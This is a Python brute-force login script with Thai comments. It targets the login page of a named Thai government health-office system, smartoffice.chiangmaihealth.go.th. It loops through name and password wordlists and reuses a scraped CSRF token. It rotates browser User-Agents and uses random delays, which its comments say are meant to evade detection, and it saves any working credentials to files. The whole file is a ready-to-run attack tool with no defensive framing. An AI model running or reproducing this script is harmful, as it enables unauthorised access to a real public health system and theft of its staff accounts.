import requests
from bs4 import BeautifulSoup
import time
import random

def read_file_lines(filename):
    """อ่านข้อมูลจากไฟล์และคืนค่าเป็น list"""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"❌ ไม่พบไฟล์ {filename}")
        return []

def brute_force_login():
    # 1. กำหนด URL
    base_url = "https://smartoffice.chiangmaihealth.go.th"
    login_url = f"{base_url}/login"
    
    # ตั้งค่าการหน่วงเวลา
    MIN_DELAY = 2.0  # หน่วงขั้นต่ำ 2 วินาที
    MAX_DELAY = 5.0  # หน่วงสูงสุด 5 วินาที
    BATCH_SIZE = 10  # ทดสอบ 10 ครั้งแล้วหยุดพักนาน
    BATCH_DELAY = 10.0  # หยุดพัก 10 วินาทีหลังทดสอบ 10 ครั้ง
    
    # 2. อ่านข้อมูลจากไฟล์
    fnames = read_file_lines('fname.txt')
    lnames = read_file_lines('lname.txt')
    passwords = read_file_lines('password.txt')
    
    if not fnames or not lnames or not passwords:
        print("❌ ไม่สามารถอ่านข้อมูลจากไฟล์ได้")
        return
    
    print(f"📊 ข้อมูลที่โหลดได้:")
    print(f"   - ชื่อ: {len(fnames)} รายการ")
    print(f"   - นามสกุล: {len(lnames)} รายการ") 
    print(f"   - รหัสผ่าน: {len(passwords)} รายการ")
    print(f"   - รวมการทดสอบ: {len(fnames) * len(lnames) * len(passwords)} รายการ")
    print("-" * 50)
    
    # 3. เริ่ม session เพื่อเก็บ cookies
    session = requests.Session()
    
    # จำลอง User-Agent แบบสุ่มเพื่อหลีกเลี่ยงการตรวจจับ
    user_agents = [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
    ]
    
    session.headers.update({
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    # 4. โหลดหน้า login เพื่อนำ CSRF Token
    try:
        response = session.get(login_url)
        print(response.text)  # <<<<< เพิ่มบรรทัดนี้
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 5. ดึง CSRF Token จาก input hidden (ตาม test.py)
        csrf_input = soup.find('input', {'name': '__RequestVerificationToken'})
        if not csrf_input:
            print("❌ ไม่พบ CSRF Token ในหน้า login")
            print("🔍 กำลังตรวจสอบ HTML structure...")
            
            # แสดง input fields ทั้งหมดเพื่อ debug
            all_inputs = soup.find_all('input')
            print(f"พบ input fields จำนวน: {len(all_inputs)}")
            for i, input_field in enumerate(all_inputs, 1):
                input_name = input_field.get('name', 'ไม่มีชื่อ')
                input_type = input_field.get('type', 'text')
                print(f"   {i}. Name: {input_name}, Type: {input_type}")
            
            return
            
        csrf_token = csrf_input['value']
        print(f"🔑 CSRF Token ที่ได้: {csrf_token}")
        print("-" * 50)
        
    except Exception as e:
        print(f"❌ เกิดข้อผิดพลาดในการโหลดหน้า login: {e}")
        return
    
    # 6. วนลูปทดสอบข้อมูล
    attempt_count = 0
    success_count = 0
    successful_logins = []  # เก็บข้อมูลที่ login สำเร็จ
    
    for fname in fnames:
        for lname in lnames:
            for password in passwords:
                attempt_count += 1
                
                # ตรวจสอบการหยุดพักหลังทดสอบหลายครั้ง
                if attempt_count % BATCH_SIZE == 0:
                    print(f"🛑 หยุดพักหลังทดสอบ {BATCH_SIZE} ครั้ง...")
                    print(f"⏳ หน่วงเวลา {BATCH_DELAY} วินาที...")
                    time.sleep(BATCH_DELAY)
                    print("▶️ เริ่มทดสอบต่อ...")
                    print("-" * 30)
                
                # เตรียมข้อมูลสำหรับ POST
                login_data = {
                    '__RequestVerificationToken': csrf_token,
                    'fname': fname,     # ใช้ตัวพิมพ์เล็กตาม test.py
                    'lname': lname,      # ใช้ตัวพิมพ์เล็กตาม test.py
                    'password': password # ใช้ตัวพิมพ์เล็กตาม test.py
                }
                
                print(f"🔍 ทดสอบครั้งที่ {attempt_count}: {fname} {lname} / {password}")
                
                try:
                    # ส่ง POST ไปยังฟอร์ม login
                    post_response = session.post(login_url, data=login_data)
                    
                    # ตรวจสอบผลลัพธ์
                    if post_response.text.strip().lower() == "true":
                        print(f"✅ Login สำเร็จ! - {fname} {lname} / {password}")
                        success_count += 1
                        successful_logins.append({
                            'fname': fname,
                            'lname': lname,
                            'password': password,
                            'attempt': attempt_count
                        })
                    else:
                        print(f"❌ Login ล้มเหลว")
                        
                except Exception as e:
                    print(f"❌ เกิดข้อผิดพลาดในการส่งข้อมูล: {e}")
                
                # หยุดพักเล็กน้อยเพื่อไม่ให้ server รับภาระมากเกินไป
                # ใช้เวลาหน่วงแบบสุ่มเพื่อหลีกเลี่ยงการตรวจจับ
                delay = random.uniform(MIN_DELAY, MAX_DELAY)  # หน่วง 2-5 วินาที
                print(f"⏳ หน่วงเวลา {delay:.1f} วินาที...")
                time.sleep(delay)
                print("-" * 30)
    
    # 7. สรุปผลลัพธ์
    print("=" * 50)
    print("📈 สรุปผลการทดสอบ:")
    print(f"   - จำนวนครั้งที่ทดสอบ: {attempt_count}")
    print(f"   - จำนวนครั้งที่สำเร็จ: {success_count}")
    print(f"   - จำนวนครั้งที่ล้มเหลว: {attempt_count - success_count}")
    print("=" * 50)
    
    # บันทึกผลลัพธ์ลงไฟล์
    try:
        with open('brute_force_results.txt', 'w', encoding='utf-8') as f:
            f.write(f"ผลการทดสอบ Brute Force Login\n")
            f.write(f"วันที่: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"=" * 50 + "\n")
            f.write(f"จำนวนครั้งที่ทดสอบ: {attempt_count}\n")
            f.write(f"จำนวนครั้งที่สำเร็จ: {success_count}\n")
            f.write(f"จำนวนครั้งที่ล้มเหลว: {attempt_count - success_count}\n")
            f.write(f"=" * 50 + "\n")
            
            if successful_logins:
                f.write(f"\n🔐 ข้อมูลที่ Login สำเร็จ:\n")
                f.write(f"-" * 30 + "\n")
                for i, login in enumerate(successful_logins, 1):
                    f.write(f"{i}. {login['fname']} {login['lname']} / {login['password']} (ครั้งที่ {login['attempt']})\n")
            else:
                f.write(f"\n❌ ไม่พบข้อมูลที่ Login สำเร็จ\n")
                
        print("💾 บันทึกผลลัพธ์ลงไฟล์ brute_force_results.txt แล้ว")
        
        # บันทึกข้อมูลที่สำเร็จลงไฟล์แยก
        if successful_logins:
            with open('successful_logins.txt', 'w', encoding='utf-8') as f:
                f.write(f"ข้อมูลที่ Login สำเร็จ\n")
                f.write(f"วันที่: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"=" * 30 + "\n")
                for login in successful_logins:
                    f.write(f"{login['fname']} {login['lname']} / {login['password']}\n")
            print("💾 บันทึกข้อมูลที่สำเร็จลงไฟล์ successful_logins.txt แล้ว")
            
    except Exception as e:
        print(f"❌ ไม่สามารถบันทึกผลลัพธ์ได้: {e}")

if __name__ == "__main__":
    print("🚀 เริ่มการทดสอบ Brute Force Login")
    print("=" * 50)
    brute_force_login()